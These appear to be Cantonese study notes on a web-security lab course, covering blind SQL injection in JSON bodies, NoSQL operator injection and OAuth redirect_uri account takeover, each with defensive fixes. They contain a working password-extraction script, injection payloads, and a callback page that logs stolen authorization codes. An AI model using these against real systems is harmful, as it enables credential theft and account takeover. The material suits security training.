**為何唔用 sqlmap？（原文 p.61）** 原文列出四個令 sqlmap 喺呢度表現差嘅原因：
1. **非標準注入點同 transport**：注入位處 `POST /login.php` body 入面一個 JSON 字串值。sqlmap 默認測 URL 參數同簡單 form field，所以呢個注入點好易被佢漏咗（除非手動配置）。
2. **自訂 bad-list filter 會改寫每個 payload**：端點喺砌 query 前會靜靜剝走 `UNION`、`;`、`--`、`/*`。sqlmap 唔知呢個 filter 存在，所以佢慣用嘅 UNION-based 同 error-based payload 到咗資料庫已經被改爛、直接失敗。
3. **冇 error 訊號**：端點捕捉 SQL 錯誤，對「密碼錯」同「語法錯」都回同一個籠統 `{"status":"error",...}` + HTTP 401，所以 error-based detection 每個 request 都見到一片平嘅、冇資訊嘅回應。
4. **Boolean 訊號需要度身訂造語法**：只有當 payload 保持 query 有效（尾隨 `OR '1'='1` 要平衡應用程式嘅收尾引號，而且答案取決於 `AND` 綁得比 `OR` 緊），個真／假答案才可見。sqlmap 嘅通用 boolean template 唔會咁塑形 payload，所以佢大部分測試 request 都係語法錯誤、睇落好似「false」。

原文結論：即使重度調參（`--level=5 --risk=3`、自訂 injection marker、度身 detection string），sqlmap 都只係「有時」被馴服；對於針對性嘅 boolean-based 攻擊，**一個細細哋、目的明確嘅 Python script 更快、更靜、更易推理** —— 亦係真實 engagement 入面攻擊者針對自訂 filter 寫度身工具嘅同一原因。起點同 lab 嘅 `tools/sqli_json.py` 一樣，都係一個帶 JSON body 嘅 `requests` POST，但唔係一擊 `OR '1'='1` payload，而係**每個 request 問資料庫一條真／假問題**。

**問資料庫一條 yes/no 問題（原文 p.61–62）**：自動化之前，先送**恰好一個**真／假 payload。下面嘅 script 問「admin 密碼嘅第一個字元係唔係 1」（原文如此）：

```python
import requests
url = "http://localhost:8080/login.php"
guess = "1"
payload = (
    "admin' AND substr((SELECT password FROM users WHERE username='admin'),1,1)='"
    + guess + "' "
    "OR '1'='1"
)
print(f"=== Guess '{guess}' ===")
print("payload:", payload)
r = requests.post(url, json={"username": payload, "password": "x"})
print(r.text)
```

原文逐行解釋：
- `import requests` —— HTTP library，三行就送出 JSON POST，唔使寫 raw socket。
- `url = "http://localhost:8080/login.php"` —— 我哋識別為注入點嘅 JSON 登入端點。**要對返 lab 實際 map 嘅 port，唔啱要改。**
- `guess = "1"` —— 呢一 run 測嘅字元；改佢再 run 就問另一個猜測。
- `payload = ( ... )` —— 注入字串，由多段 Python string 砌成一個值，`guess` 嵌喺字元位置。佢會成為 JSON body 入面嘅 username。
- `print(f"=== Guess '{guess}' ===")` 同 `print("payload:", payload)` —— 標示 run、並 echo 實際送出嘅 payload，令終端輸出可以逐行重現。
- `requests.post(url, json={...})` —— `json=` 參數令 requests 自動設 `Content-Type: application/json` 並把 body JSON-encode，所以單引號會以無害嘅 JSON 資料身分傳送，只有當伺服器把它黐入 query 字串之後才變成 SQL 語法。
- `print(r.text)` —— 印原始回應，等我哋自動化前先用眼確認伺服器答「真」定「假」。

**payload 逐件拆解（原文 p.62）**：
- `admin'` —— 應用程式把 username 包喺單引號（`username = '$username'`），所以我哋嘅值提早收咗個字串。引號之後所有嘢都被資料庫當成 SQL 語法，而非資料。
- `AND` —— 為 username 測試加第二個條件；因為 AND 綁得比 OR 緊，佢會同 `username='admin'` 組埋一齊。
- `substr((SELECT password FROM users WHERE username='admin'),1,1)` —— 一個子查詢讀 admin 嗰行嘅 password 欄，`substr(string, start, length)` 切出一個字元：start 1、length 1 —— 即係密碼嘅第一個字元。
- `='1'` —— 把嗰個字元同比我哋嘅猜測。呢個就係 yes/no 問題：「admin 密碼嘅第一個字元係唔係 1？」
- `OR '1'='1` —— 保持 query 語法有效：最後個引號留唔封，等應用程式自己嘅收尾引號完成 `'1'='1`。按優先次序呢個尾巴會同 `password = 'x'` 組埋（false），所以佢本身永遠冇能力令 query 為真 —— 佢純粹係平衡引號。

**逐次比對兩個可能答案（原文 p.62–63）**：真答案（字元吻合）回 **HTTP 200 + `{"status":"ok",...}`**；假答案回 **HTTP 401 + `{"status":"error","message":"Invalid credentials"}`**。原文終端輸出（Screenshot 93）第一次猜 `z`、第二次猜 `1` —— 儲存嘅 admin 密碼以 `1` 開頭（原文如此）：

```plaintext
=== Guess 'z' ===
payload: admin' AND substr((SELECT password FROM users WHERE username='admin'),
1,1)='z' OR '1'='1
{"status":"error","message":"Invalid credentials"}   (wrong guess)
=== Guess '1' ===
payload: admin' AND substr((SELECT password FROM users WHERE username='admin'),
1,1)='1' OR '1'='1
{"status":"ok","message":"Logged in as admin","role":"admin"}   (correct)
```

> **圖示描述**：終端顯示單一猜測 script 嘅兩次執行輸出 —— 猜 `z` 回 `{"status":"error","message":"Invalid credentials"}`，猜 `1` 回 `{"status":"ok","message":"Logged in as admin","role":"admin"}`（對應原教材 Screenshot 93，本筆記不轉載圖片）。

**讀輸出（原文 p.63）**：`"status":"ok"` 代表你注入嘅 `substr(...)= '1'` 條件為真，即係 `1` 真係 admin 密碼嘅第一個字元；error 回應就係「否」嘅答案。

> **圖示描述**：顯示 error 回應（`{"status":"error","message":"Invalid credentials"}`）作為「否」答案嘅畫面（對應原教材 Screenshot 38，本筆記不轉載圖片）。

**步驟：存做 `blind_sqli.py` 並執行（原文 p.63）**：逐個字元手動猜係啱但慢。把單次檢查包喺兩個 loop —— 一個走字元集、一個走位置 —— 就自動幫你還原密碼（原文如此）：

```python
import requests
import string
url = "http://localhost:8080/login.php"
chars = string.ascii_lowercase + string.digits + ''.join(c for c in 
string.punctuation if c != ';')
result = ""
for pos in range(1, 20):
    found = False
    for c in chars:
        payload = (
            f"admin' AND substr((SELECT password FROM users WHERE username='admin'),"
            f"{pos},1)='{c}' OR '1'='1"
        )
        r = requests.post(url, json={"username": payload, "password": "x"})
        if '"status":"ok"' in r.text:
            result += c
            print(f"Position {pos}: {c}  →  {result}")
            found = True
            break
    if not found:
        break
print("Extracted password:", result)
```

原文解釋：**內層 loop** 就係上一步嘅單次猜測檢查 —— 佢行遍 charset（先小寫字母、再數字、再符號 —— 排除 `;`，因為 filter 會剝走佢），直到伺服器答 ok，`break` 停 loop。**外層 loop** 每 round 把 `substr()` 起始位置向前移一個字元；當一整 round 猜測都冇 ok，代表密碼已完整，外層 `break` 結束 run。每一行 `Position N: c → ...` 就係一個字元嘅「是」答案 —— 冒號後個字元係伺服器確認嘅字元，箭嘴後個字串係目前已還原嘅全部。

**執行並觀察密碼逐字浮現（原文 p.64）**：存做 `blind_sqli.py`，由終端 run（`python3 blind_sqli.py`），就會見到密碼逐個字元出現 —— 每還原一個字元一行 `Position N`，最後 `Extracted password: 123qwe!@#` —— 完整 admin 密碼，全程冇見過一個資料庫錯誤（Screenshot 39–41，原文如此）：

```plaintext
Position 1: 1  →  1
Position 2: 2  →  12
Position 3: 3  →  123
Position 4: q  →  123q
Position 5: w  →  123qw
Position 6: e  →  123qwe
Position 7: !  →  123qwe!
Position 8: @  →  123qwe!@
Position 9: #  →  123qwe!@#
Extracted password: 123qwe!@#
```

> **圖示描述**：終端顯示 `blind_sqli.py` 執行過程，密碼逐個字元浮現，每行一個 `Position N: c → ...`（對應原教材 Screenshot 39，本筆記不轉載圖片）。

> **圖示描述**：終端顯示 `blind_sqli.py` 執行中段輸出，已還原密碼持續增長（對應原教材 Screenshot 40，本筆記不轉載圖片）。

> **圖示描述**：終端顯示 `blind_sqli.py` 執行結束，最後一行 `Extracted password: 123qwe!@#`（對應原教材 Screenshot 41，本筆記不轉載圖片）。

**步驟：用抽出嚟嘅密碼登入（原文 p.64）**：去 `/login.php` 以 admin + 還原密碼登入，確認 blind injection 真係漏到真資料 —— 伺服器答 `{"status":"ok","message":"Logged in as admin","role":"admin"}`，同經典注入一樣嘅回應，但今次係**逐個字元、全程冇見過資料庫錯誤**攞到嘅。

> **圖示描述**：以還原密碼登入 `/login.php` 嘅畫面，回應 `{"status":"ok","message":"Logged in as admin","role":"admin"}`（對應原教材 Screenshot 42，本筆記不轉載圖片）。

**Conclusion（原文 p.64）**：filter 封咗明顯關鍵詞，但阻止唔到資料庫評估一條**語法有效**嘅 query。攻擊者用子查詢入面嘅真／假條件，就可以問資料庫 yes/no 問題，逐個字元漏資料。

> **English Standard Definition:** The filter blocks obvious keywords but does not stop the database from evaluating a syntactically valid query. By using a true/false condition in a subquery, the attacker can ask the database yes/no questions and leak data one character at a time.

**How to fix（原文 p.65，defenders）**：**永遠唔好靠串接使用者輸入去砌 SQL** —— 用 **PDO prepared statements + bound parameters**，令每個值都停留喺「資料」身分、唔會變「代碼」；**把 JSON body 同表單欄位同等看待（同樣懷疑）**；回**籠統錯誤訊息**，唔好分辨「密碼錯」定「語法錯」；同埋**對登入嘗試做 rate-limit**。原文收尾一句：keyword bad-list 最多只係一個 **speed bump（減速壆）** —— 本節已示範佢喺 boolean-based blind extraction 之前點樣摺埋。

> **English Standard Definition:** A keyword bad-list is at best a speed bump — this section showed it folding under boolean-based blind extraction.

---

### 4.2 §12 NoSQL Injection via JSON Wildcard（原文 p.127–132）

原文嘅學習目標：identify NoSQL injection in a JSON API, use a wildcard operator to return unauthorized records, and explain why NoSQL queries need the same input validation as SQL。

#### 4.2.1 What is it and why does it work?（原文 p.127–129）

**繁中解說**：NoSQL 資料庫（例如 **MongoDB**）用 **document（文件）** 存記錄 —— 即係啲 JSON-like 物件，group 成 **collection（集合）**，而唔係 MySQL 嗰種「表 + 行」。單一 document 可以有 nested field 而無固定結構。原文畀嘅 user record 例子（在一個叫 `users` 嘅 collection 入面，原文如此）：

```json
{
  "username": "admin",
  "password": "123",
  "role": "administrator",
  "address": { "city": "Hong Kong", "district": "Central" }
}
```

**查詢唔係 SQL 文字字串，而係 operator-based 嘅 query object（運算子查詢物件）**，一樣係 JSON 風格。喺 MongoDB shell（或應用程式碼嘅對應 driver 呼叫），一個登入檢查長咁樣（原文如此）：

```plaintext
db.users.findOne({ username: "admin", password: "123" })
```

呢句回傳**第一個兩個欄位都吻合嘅 document**。原文點出：`$ne`（not equal，唔等於）、`$gt`（greater than，大於）、`$regex`（正則）、`$where` 係 query object 入面嘅**特殊 key（operator）**，而且有啲 driver 仲會展開 wildcard 字元例如 `*`。

> **English Standard Definition:** NoSQL databases such as MongoDB store records as documents — JSON-like objects grouped into collections — and their queries are operator-based objects written in the same JSON style.

**NoSQL 喺 web application 點用（原文 p.127）**：前端收集輸入、以 JSON body 送去後端；後端 decode JSON，再**把 decode 咗嘅值直接放入 query filter**。lab 嘅版本係 `api/lookup.php`，可以喺瀏覽器讀：`http://localhost:8080/api/lookup.php`（或 `view-source:` 版本，原文如此）：

```php
$raw  = file_get_contents('php://input');      // {"username":"admin","password":"123"}
$data = json_decode($raw, true);               // PHP array from the JSON
$user = $db->users->findOne([
    'username' => $data['username'],
    'password' => $data['password'],
]);
```

> **圖示描述**：瀏覽器顯示 `api/lookup.php` 原始碼，可見 `json_decode($raw, true)` 之後把 `$data['username']`／`$data['password']` 直接放入 `findOne([...])` query filter（對應原教材 Screenshot 109，本筆記不轉載圖片）。

原文重點：開發者**從來冇寫 SQL 字串，所以感覺「安全」** —— 但 decode 咗嘅使用者輸入仍然被放入 query object，喺嗰度可以被解讀成**查詢邏輯**。

**NoSQL（MongoDB）vs MySQL 對照（原文 p.128）**：

| Aspect | MySQL（relational／SQL） | MongoDB（NoSQL／document） |
|---|---|---|
| Data structure | Tables with fixed columns | Collections of schema-less JSON documents |
| Schema | Fixed schema defined in advance | Schema-less; each document may have different fields |
| Query language | SQL text, e.g. `SELECT * FROM users WHERE username = 'admin'` | Query objects, e.g. `db.users.find({username: "admin"})` |
| Injection risk | SQL keywords：`OR '1'='1`、`UNION` | Operators：`{$ne: ...}`、`{$gt: ...}`、`{$regex: ...}`、`*` wildcards |

**為何可以純靠 web 就利用得到（原文 p.128）**：攻擊者**唔需要資料庫存取權** —— 佢淨係控制一個 HTTP request 嘅 JSON body。如果使用者輸入落入 query object 而**冇 type casting 或驗證**，攻擊者就可以把一個字串值換成一個**含特殊 operator 嘅物件**。一個有漏洞嘅登入端點可能收到（原文如此）：

```json
{"username":"admin", "password":{"$ne":""}}
```

因為 `{"$ne":""}` 係一個**物件**而唔係字串，filter 就變成「password 唔等於空字串」—— 對**每一筆**記錄都為真 —— 所以攻擊者唔使知密碼就登入咗。同樣道理用喺 wildcard lookup：送 `"role":"*"` 就會把精確匹配嘅 lookup 變成 match-everything 查詢。一句總結：**NoSQL injection 只係把 SQL injection 翻譯成 JSON：未受信任嘅輸入變成查詢邏輯，而唔係資料值。**

> **English Standard Definition:** NoSQL injection is simply SQL injection translated into JSON: untrusted input becomes query logic instead of a data value.

**本 lab 嘅實作（原文 p.128–129）**：`/api/lookup.php` 收 JSON，並由 **role 值**砌出 query。後端**喺 SQLite 之上模擬 MongoDB 行為**：值入面一個 `*` 會被重寫成 SQL `LIKE` 比較嘅 `%` wildcard；一個 `{"$ne":"..."}` 物件會被解讀成「唔等於」operator 而唔係字面字串。兩個替換都發生喺 **query-logic 層**，所以把預期嘅 role 字串換走，就會回傳**表內每一筆記錄**，而唔係某一個特定 role。

**OWASP／CWE 對應（原文 p.129）**：
- **OWASP mapping**：**A03:2021 — Injection**
- **CWE-943**：Improper Neutralization of Special Elements in Data Query Logic
- 原文觀察：NoSQL injection 成日被忽略，因為開發者**以為 NoSQL 對 SQL 式攻擊免疫**。

**Conclusion（原文 p.129）**：MongoDB 查詢用 `$where`、`$regex`、`$ne` 等 operator；如果使用者輸入**冇 type casting 或驗證**就成為 query filter 一部份，呢啲 operator 就可以好似 SQL keyword 一樣被注入。真實世界影響包括 **authentication bypass、data exfiltration、privilege escalation**。標準防禦係用 **parameterized queries 或 ORM 方法**，令使用者輸入被當成**資料值**而非**查詢語法**。

**How to fix（原文 p.129，defenders）**：**永遠唔好把 decode 咗嘅 JSON 直接放入 query filter**。把值 **type-cast** 成預期型別、**拒絕物件同 operator key**（例如 `$ne`、`$gt`、`$where`）出現喺使用者輸入、並用 **parameterized queries 或 ORM 方法**把輸入綁定成資料。

> **English Standard Definition:** The canonical defense is to use parameterized queries or ORM methods that treat user input as data values rather than query syntax.

#### 4.2.2 How to find it（原文 p.129–130）

1. **搵收 JSON、並根據某欄位值回傳 document 嘅 API 端點** —— 呢啲就係目標：accept JSON 並以 field value filter 回 document 嘅 endpoint。
2. **測試特殊字元或 operator 會唔會改變結果集** —— 一個 wildcard `*` 或 NoSQL operator 例如 `$ne` **唔應該**被當成字面字串。
3. **比較送具體值 vs wildcard／operator 嘅回應數量** —— operator payload 回嘅結果集**大啲**就代表有注入。

> **English Standard Definition:** A larger result set for an operator payload versus a specific value indicates injection.

#### 4.2.3 Try it yourself（原文 p.130–131）

**步驟 1 — 定位 lookup 端點（原文 p.130）**：喺 Firefox 瀏覽 `/api/lookup.php` —— 個端點喺網站 UI 冇任何連結，所以直接呼叫。佢收 JSON body 帶一個 `role` 欄；**普通 GET 冇 body 會回空 JSON array（`[]`）**；端點只答 POST 嘅 JSON（Screenshot 68）。

> **圖示描述**：Firefox 瀏覽 `/api/lookup.php`，以 GET 無 body 請求，回應係空 JSON array `[]`（對應原教材 Screenshot 68，本筆記不轉載圖片）。

**步驟 2 — 送一個正常 query（原文 p.131）**：喺 Burp Repeater 送 POST，body 如下（原文如此）：

```json
{"role":"user"}
```

回應只含 role 係 `user` 嘅使用者 —— **五筆**記錄（Screenshot 69）。

> **圖示描述**：Burp Repeater 送 `POST /api/lookup.php` body `{"role":"user"}`，回應只含五筆 role 為 user 嘅記錄（對應原教材 Screenshot 69，本筆記不轉載圖片）。

**步驟 3 — 注入 wildcard 回傳所有記錄（原文 p.131）**：把 body 改成（原文如此）：

```json
{"role":"*"}
```

回應而家含 collection 內**每一個**使用者 —— **全部六筆**記錄，包括 administrators 同隱藏 service account（Screenshot 70）。

> **圖示描述**：Burp Repeater 送 `{"role":"*"}`，回應含全部六筆記錄、包括 administrators 同隱藏 service account（對應原教材 Screenshot 70，本筆記不轉載圖片）。

**步驟 4 — 試 NoSQL operator payload（原文 p.131）**：如果端點把 JSON 直接交畀 MongoDB-style query，試（原文如此）：

```json
{"role":{"$ne":"nonexistent"}}
```

`$ne` operator 意思係「唔等於 nonexistent」，對每一筆真記錄都為真 —— 即係 `OR '1'='1` 嘅 NoSQL 等價物。喺本 lab，端點喺 SQL 後端之上模擬 MongoDB operator（見 `api/lookup.php`：一個帶 `$ne` key 嘅 array 值會變成 `role != :r` query）—— 你會攞到同 wildcard 一樣嘅**完整六筆清單**，因為每一個儲存咗嘅 role 都唔等於 `"nonexistent"`（Screenshot 71）。

> **圖示描述**：Burp Repeater 送 `{"role":{"$ne":"nonexistent"}}`，回應同樣含全部六筆記錄，等同 wildcard 效果（對應原教材 Screenshot 71，本筆記不轉載圖片）。

**Recap（原文 p.131）**：理論區塊已解釋成因 —— 使用者提供嘅 role 值被**直接放入 query filter**，所以 wildcard 或 operator 被解讀成**查詢邏輯**而非字面字串。

---

### 4.3 §13 OAuth / SSO Misconfiguration（原文 p.133–142）

> ⚠️ 教材外補充：原文 attack-chain mapping 冇收錄 §13，此處按「OAuth 設定錯誤＝帳號接管」歸入初始存取。

原文嘅學習目標：explain how OAuth 2.0 authorization codes and redirect URIs work, identify a missing redirect-uri allow-list on an identity provider, and demonstrate account takeover by stealing a code through a malicious callback URL。

#### 4.3.1 What is it and why does it work?（原文 p.133–134）

**繁中解說**：**OAuth 2.0 同 OpenID Connect** 把認證委派畀一個外部 **identity provider（身分提供者）**。當使用者撳「**Login with Government SSO**」，應用程式（**relying party**）會把瀏覽器 redirect 去 provider。provider 驗證使用者之後，把瀏覽器 redirect 返應用程式 —— 經一個 **callback URL（又叫 redirect URI）** —— 並喺後面附上一個短命嘅 **authorization code** 同**原本 relying party 提供嘅同一個 `state` 值**。relying party 之後喺一個 **server-to-server call** 之中，向 provider 嘅 **token endpoint** 換取身分資訊。

> **English Standard Definition:** OAuth 2.0 and OpenID Connect delegate authentication to an external identity provider. The relying party receives a short-lived authorization code on a callback URL and exchanges it for identity information in a server-to-server call to the provider's token endpoint.

**本 lab 模擬（原文 p.133）**：一個真實外部 provider 模擬版本喺 `http://localhost:8080/oauth_provider.php`。provider 有登入表單、驗證憑證、發出**隨機、一次性（single-use）嘅 authorization code**、亦有 token endpoint。**但佢故意設定錯誤**：**佢唔會用 allow-list 驗證 `redirect_uri`，佢喺 token endpoint 亦唔會認證 client**。呢兩個錯誤令攻擊者可以偷到一個有效 authorization code，再用佢 **force-login 成受害人**。

**三大控制（原文 p.134）**：原文結論話 OAuth 流程嘅安全取決於三個控制：
1. **Exact redirect_uri matching（完全一致的 redirect_uri 匹配）**：provider 只可以 redirect code 去已登記嘅 URI；相關弱點係 **CWE-346（Origin Validation Error）**。常見失敗係 wildcard／prefix 匹配，或者完全冇驗證。
2. **A per-session, cryptographically random state（每 session、密碼學隨機嘅 state）**：呢個係流程嘅 **CSRF 防禦**：relying party 必須拒收任何 `state` 同自己 session 唔對嘅 callback。
3. **Short-lived, single-use codes exchanged server-to-server（短命、一次性嘅 code，以 server-to-server 交換）**：token endpoint 必須**認證 client**，而 public client 應該額外用 **PKCE**。

原文仲提其他已記錄嘅設定錯誤：使用**已棄用嘅 Implicit flow**（會把 token 暴露喺 URL fragment）、同埋**喺 token endpoint 省略 client authentication**。**RFC 9700**（OAuth 2.0 Security Best Current Practice）記錄咗所需嘅緩解措施，包括**exact redirect-URI matching** 同**所有 client 都要用 PKCE**。

**OWASP／CWE 對應（原文 p.134）**：
- **OWASP mapping**：**A07:2021 — Identification and Authentication Failures** ／ **OWASP API Top 10 API2 — Broken Authentication**
- **CWE-346**：Origin Validation Error（對應 redirect_uri 驗證缺失）
- 原文觀察：透過未驗證 redirect URI 嘅 OAuth 帳號接管，曾經影響大型 social-login provider 同佢哋嘅 relying party。

**How to fix（原文 p.134，defenders）**：喺 provider **登記 redirect URI 並完全一致咁匹配**（冇 wildcard、冇 prefix matching）；**每個 callback 都要求並驗證一個每 session 隨機嘅 `state`**；喺 token endpoint **用 `client_id` 同 `client_secret` 認證 client**；**保持 authorization code 短命同一次性**；並按 **RFC 9700** 要求**所有 client 都用 PKCE**。

#### 4.3.2 How to find it（原文 p.134–138）

1. **手動 trace 整個 authorization flow**：撳 SSO 按鈕，留意**網址欄**同 DevTools 嘅 **Network tab**，睇住 redirect 喺邊度跳。
2. **檢查 authorize request 嘅 `client_id`、`redirect_uri`、`response_type`、`state`**。
3. **驗證 provider 係由一個真登入頁發出「新鮮、隨機」嘅 authorization code**，而唔係 echo 一個固定值（固定值可以被 replay）。
4. **改 `redirect_uri` 參數**：如果 provider 仍然 redirect 並帶一個有效 code，佢就冇強制執行 exact registered allow-list。
5. **檢查 token endpoint 會唔會要求 client authentication**：冇認證嘅話，任何人偷到個 code 都可以兌換。

> **English Standard Definition:** If an edited redirect_uri still redirects with a valid code, no exact registered allow-list is enforced; without client authentication at the token endpoint, a stolen code can be exchanged by anyone.

#### 4.3.3 Try it yourself（原文 p.138–142）

**步驟 1 — 開始 SSO flow，觀察一個真實感嘅 provider（原文 p.138）**：喺 Firefox 開 `/login.php`（Screenshot 72），撳「**Login with Government SSO**」（確保 Firefox 經 Burp 代理，如 §0 設定）。relying party 會**產生一個新鮮隨機 `state`、存喺你嘅 session**，然後 redirect 你去 `/oauth_provider.php?action=authorize&....`。provider 顯示佢自己嘅登入表單（Screenshot 73）。喺嗰度以 `admin` / `123qwe!@#` 登入，觀察你被 redirect 返 relying party —— 佢用 code 換你嘅身分、把你登入 —— provider 登入之後你落返 relying party，見到一個「**Welcome back**」flash message，以 `admin` 身分登入。

> **圖示描述**：`/login.php` 頁面，帶一個「Login with Government SSO」按鈕（對應原教材 Screenshot 72，本筆記不轉載圖片）。

> **圖示描述**：provider（`oauth_provider.php`）自己嘅登入表單，要求使用者輸入憑證（對應原教材 Screenshot 73，本筆記不轉載圖片）。

**步驟 2 — 喺 Burp Repeater 捕捉 authorize request（原文 p.139）**：喺 Burp 揀 HTTP history 入面去 `/oauth_provider.php?action=authorize&...` 嘅 **GET** request，send to Repeater。留意參數：`client_id=gov_lab`、`response_type=code`、`redirect_uri=http://localhost:8080/oauth.php?action=callback`、同一個隨機 `state` —— Repeater 顯示全部四個參數，而 `state` 值**每次登入嘗試都會變**，呢個係正確行為。

**步驟 3 — 把 redirect_uri 改成攻擊者嘅 callback URL（原文 p.140）**：首先，起攻擊者嘅伺服器。真實攻擊入面 callback page 放喺攻擊者控制嘅基建（例如 `https://attacker.example.com/callback`）；本 lab 用以下小頁面喺 `/tmp/attacker/callback.php` 模擬，並喺 port 9099 起多一個 web server（原文如此）：

```bash
mkdir -p /tmp/attacker
cat > /tmp/attacker/callback.php <<'PHP'
<?php
// The "attacker's" callback page: display and log whatever it receives.
$code  = $_GET['code']  ?? '(none)';
$state = $_GET['state'] ?? '(none)';
file_put_contents('/tmp/attacker/callback.log',
    date('H:i:s') . " code=$code state=$state\n", FILE_APPEND);
?>
<html><body><h1>ATTACKER CALLBACK SERVER</h1>
<pre>code  = <?= htmlspecialchars($code) ?>
state = <?= htmlspecialchars($state) ?></pre></body></html>
PHP
php -S 127.0.0.1:9099 -t /tmp/attacker
```

喺 Burp Repeater，編輯你上一步捕捉嘅 authorize request，**只改 `redirect_uri` 參數**成 `http://localhost:9099/callback.php`，然後撳 **Send** —— provider **仍然**回一個 **HTTP 302 redirect**，但 `Location` header 而家指向你嘅「攻擊者」伺服器，並帶一個**新發出、有效嘅 code 同 state**：provider **從來冇用 allow-list 檢查過 callback URL**。

**步驟 4 — 跟隨 redirect，捕捉偷到嘅 code（原文 p.140）**：喺 Burp Repeater，喺回應度右鍵揀 **Follow redirection** —— Repeater 自己發跟進 request，喺回應 pane 顯示攻擊者嘅 callback page，展示被截取嘅 callback 參數：偷到嘅 code 同佢嘅 state（Screenshot 74）。（或者複製 `Location` header 嘅 URL，喺新瀏覽器 tab 開 —— 瀏覽器就會請求攻擊者 callback URL，顯示同樣嘅截取參數。）任何一種方法，攻擊者伺服器嘅 log 都會記低同樣嘅值（Screenshot 100）。**複製 code 值：你而家持有一個有效 authorization code，屬於啱啱喺 provider 登入嗰個帳號，而你從來冇見過嗰個使用者嘅憑證。** 真實攻擊入面，受害人嘅瀏覽器會被 redirect 去攻擊者伺服器，由佢自動記低 code。

> **圖示描述**：Burp Repeater 回應 pane 顯示攻擊者 callback page，展示截取到嘅 `code` 同 `state` 參數（對應原教材 Screenshot 74，本筆記不轉載圖片）。

> **圖示描述**：攻擊者伺服器嘅 log 檔（`/tmp/attacker/callback.log`）記低咗收到嘅 code 同 state（對應原教材 Screenshot 100，本筆記不轉載圖片）。

**步驟 5 — 用偷到嘅 code 喺 relying party force-login（原文 p.141）**：返去 relying-party tab，**先去 `/oauth.php?action=start`**，令你嘅瀏覽器 session 攞到一個**新鮮、匹配嘅 `state`**。然後把偷到嘅 code 貼入 callback URL。**重要**：要用你瀏覽器網址欄**喺去完 `action=start` 之後顯示嘅新 `state` 值**（瀏覽器會被 redirect 去 provider 嘅 authorize URL，嗰度帶住新鮮 `state` 做 query parameter）—— 偷到嗰個 state 係屬較早前嗰個 authorize request，會被拒收並回「**Invalid state parameter**」（原文如此）：

```plaintext
http://localhost:8080/oauth.php?action=callback&code=<STOLEN_CODE>&state=<FRESH_STATE>
```

relying party 接受個 code、向 provider 嘅 token endpoint 兌換、然後 redirect 你去 `/index.php`，以**喺 provider 認證嗰個使用者**身分登入（Screenshot 75）。

> **圖示描述**：relying party 完成兌換後 redirect 去 `/index.php`，以目標使用者身分登入（對應原教材 Screenshot 75，本筆記不轉載圖片）。

**步驟 6 — 確認你已用目標使用者身分登入（原文 p.141）**：開 `/profile.php` —— 頁面顯示 `admin`（或你喺 provider 認證嗰個使用者）（Screenshot 76），**即使你從來冇喺 relying party 自己嘅登入表單度輸入過嗰個使用者嘅憑證**。

> **圖示描述**：`/profile.php` 頁面顯示 `admin`，證明已接管該帳號（對應原教材 Screenshot 76，本筆記不轉載圖片）。

**Recap（原文 p.142）**：理論區塊列出流程依賴嘅三個控制。呢度有**兩個**失效 —— provider 接受咗任意 `redirect_uri`，而 token endpoint 喺**冇 client credentials** 之下兌換咗 code —— 但 **`state` 檢查做咗佢嘅本分**，所以你要把偷到嘅 code 配一個**新鮮 state** 才成事。

---

## 🛠️ 5. 逐節實戰步驟（Try it yourself — Walkthrough）

本節把第 4 節嘅步驟重新以「**做乜 ➔ 喺邊度睇 ➔ 預期結果 ➔ 成功／失敗點分辨**」嘅格式整理，方便你實作時照跟。URL／payload 一字不改。

### 5.1 §4 SQLi in JSON — 走一次完整攻擊鏈

**Step 1：確認端點收 JSON**
- 做乜：喺 Burp 攔 `POST /login.php`，加 / 改 header `Content-Type: application/json`。
- 喺邊度睇：Burp Proxy → HTTP history。
- 預期結果：端點照樣回 JSON（唔再係 HTML 表單）。
- 分辨：如果回 HTML 或 redirect 去登入頁，即係個 JSON code path 冇觸發 —— 檢查 `Content-Type` 係唔係打錯。

**Step 2：單引號探測**
- 做乜：body 用 `{"username":"'","password":"x"}`。
- 喺邊度睇：Burp Repeater 回應。
- 預期結果：回應**明顯唔同**（可能係錯誤或唔同狀態）。
- 分辨：如果同正常「登入失敗」完全一樣，可能 filter 過濾咗單引號或成個回應被統一 —— 轉去 blind 路線。

**Step 3：tautology 繞過登入**
- 做乜：body 改成 `{"username":"admin' OR '1'='1","password":"x"}`。
- 喺邊度睇：回應 body + header。
- 預期結果：HTTP 200 + `{"status":"ok","message":"Logged in as admin","role":"admin"}` + `Set-Cookie`。
- 分辨：出現 `status":"ok"` 就係成功；見 `Invalid credentials` 就係 payload 或引號數目唔啱。

**Step 4：用 admin session 入後台**
- 做乜：複製 `Set-Cookie`，喺瀏覽器 cookie storage 為 `localhost:8080` 加入；或喺 Repeater 建立 `GET /admin.php` 並貼 `Cookie` header。
- 喺邊度睇：`http://localhost:8080/admin.php`。
- 預期結果：admin dashboard + 綠色 `FLAG{HIDDEN_ADMIN_ENDPOINT_ESCALATION_SUCCESS}`。
- 分辨：如果又被踢返登入頁，多數係 cookie 貼漏／貼錯 domain。

**Step 5：確認 bad-list filter 封咩**
- 做乜：分別送含 `UNION`、`;`、`--`、`/*` 嘅 probe。
- 喺邊度睇：回應係唔係變返一致嘅「登入失敗」。
- 預期結果：呢批 token 被剝走，回應一致。
- 分辨：若某個 token 令回應唔同，代表 filter 漏咗佢。

**Step 6：布林 blind 訊號**
- 做乜：送兩個 payload：
  `{"username":"admin' AND '1'='1' OR '1'='1","password":"x"}`
  `{"username":"admin' AND '1'='2' OR '1'='1","password":"x"}`
- 喺邊度睇：HTTP 狀態碼。
- 預期結果：前者 **200 `"status":"ok"`**、後者 **401 `"status":"error","message":"Invalid credentials"`**。
- 分辨：兩個回應若一樣，即係你嘅條件被 filter 改爛（檢查引號平衡）。

**Step 7：自動逐位抽密碼**
- 做乜：存 `blind_sqli.py`（第 4 節原文 script），`python3 blind_sqli.py`。
- 喺邊度睇：終端逐行 `Position N: c → ...`。
- 預期結果：最後 `Extracted password: 123qwe!@#`。
- 分辨：若某 position 卡死（`found=False`）即提早結束，通常係 charset 冇包到目標字元（例如大寫）或 `;` 相關邊界。

**Step 8：用抽到嘅密碼登入驗證**
- 做乜：`/login.php` 用 `admin` / 抽出嘅密碼登入。
- 喺邊度睇：回應。
- 預期結果：`{"status":"ok","message":"Logged in as admin","role":"admin"}`。
- 分辨：回 ok 即證明 blind 漏到真資料。

### 5.2 §12 NoSQL Injection — 走一次完整攻擊鏈

**Step 1：定位端點**
- 做乜：GET `http://localhost:8080/api/lookup.php`（無 body）。
- 喺邊度睇：Firefox。
- 預期結果：`[]`（空 JSON array）。
- 分辨：回空 array 即證明端點只答 POSTed JSON。
